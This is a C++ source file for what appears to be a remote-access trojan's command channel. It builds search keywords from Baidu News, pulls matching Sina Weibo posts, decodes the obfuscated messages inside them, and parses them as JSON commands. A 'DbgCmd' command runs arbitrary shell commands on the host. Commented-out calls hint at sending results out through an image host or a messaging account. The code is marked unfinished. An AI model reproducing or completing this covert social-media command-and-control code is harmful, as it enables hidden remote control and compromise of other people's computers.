#include "Routines.h"
#include "Debug.h"

void InternetRoutine::SetMessageRoutine(MessageRoutine *msgRoutine) {
	MsgRoutine = msgRoutine;
}

void InternetRoutine::SetThreadHub(ThreadHub *th) {
	threadHub = th;
}

void InternetRoutine::SetMainStub(ThreadRoutine mainStub) {
	MainStub = mainStub;
}

void InternetRoutine::InternetMainThread() {
	std::string BaiduNewsKeyword;
	std::vector<std::string> WeiboMessage;
	int keywordLength = 8;
	int obfuscateKeyLength = 10;
	int InternetState;
	Crypto crypto;
	threadHub->SetState(MainStub, Running);
	while (true) {
		InternetState = internetUtility.CheckInternetConnection();
		if (InternetState == InternetUtility::Online) {
			fOnline = true;
			internetUtility.GenerateKeywordFromBaiduNews(keywordLength, BaiduNewsKeyword);
			internetUtility.GetMessageFromSina(BaiduNewsKeyword, WeiboMessage);
			for (auto i = WeiboMessage.begin(); i != WeiboMessage.end(); ++i) {
				std::string tmp_key, tmp_text;
				tmp_key.assign(i->begin(), i->begin() + obfuscateKeyLength);
				tmp_text.assign(i->begin() + obfuscateKeyLength, i->end());
				BinaryData bd(tmp_text.length() + 1, tmp_text.c_str());
				std::string decoded_text = crypto.DecodeTextObfuscate(&bd, &tmp_key);
				MsgRoutine->AddMessage(BaiduNewsKeyword, tmp_key, decoded_text);
			}
			WeiboMessage.clear();
		}
		else {
			fOnline = false;
		}
	}
}

void MessageRoutine::AddMessage(std::string Keyword, std::string ObfuscateKey, std::string DecryptedMessage) {
	Message msg;
	msg.Keyword = Keyword;
	msg.ObfuscateKey = ObfuscateKey;
	msg.DecryptedMessage = DecryptedMessage;
	msg.State = 1;
	if (SearchMessage(ObfuscateKey).Keyword=="empty") {
		locked = true;
		messageQueue.push_back(msg);
		locked = false;
	}
}

MessageRoutine::Message MessageRoutine::SearchMessage(std::string ObfuscateKey) {
	Message emptymsg;
	emptymsg.Keyword = "empty";
	emptymsg.ObfuscateKey = "empty";
	for (auto i = messageQueue.begin(); i != messageQueue.end(); ++i)
		if (i->ObfuscateKey == ObfuscateKey)
			return *i;
	return emptymsg;
}

MessageRoutine::ParseResult MessageRoutine::ParseMessage(std::string msg) {
	using namespace rapidjson;
	Document doc;
	doc.Parse(msg.c_str());
	ShellCmd shell;
	std::string shell_out;
	if (!doc.IsObject())
		return error;
	//under construction
	if (!doc.HasMember("op"))
		return pop;
	std::string op = doc["op"].GetString();
	if (op == "DbgMsgBox") {
		DbgMsgBoxA("debug", "%s", doc["param"].GetString());
		return pop;
	}
	if (op == "DbgCmd") {
		shell.Cmd(doc["param"].GetString(), shell_out);
		InternetUtility iu;
		JPGFileProcess jfp;
		//iu.UploadJPGToTietuku()
		//iu.SendMessageToPOJAccount()
		return pop;
	}
}

void MessageRoutine::MessageMainThread() {
	//under construction
	while (true) {
		if (locked)
			continue;
		for (auto i = messageQueue.begin(); i != messageQueue.end(); ++i) {
			if (locked)
				break;
			if (i->State) {
				ParseResult res = ParseMessage(i->DecryptedMessage);
				if (res == pop) {
					i->State = 0;
					i->DecryptedMessage.clear();
					i->Keyword.clear();
					break;
				}
			}
		}
	}
}

bool MessageRoutine::RemoveMessage(std::string ObfuscateKey) {
	for (auto i = messageQueue.begin(); i != messageQueue.end(); ++i)
		if (i->ObfuscateKey == ObfuscateKey) {
			locked = true;
			messageQueue.erase(i);
			locked = false;
			return true;
		}
	return false;
}

void MessageRoutine::SetThreadHub(ThreadHub *th) {
	threadHub = th;
}

void MessageRoutine::SetMainStub(ThreadRoutine mainStub) {
	MainStub = mainStub;
}

void MessageRoutine::Expunge() {
	messageQueue.clear();
}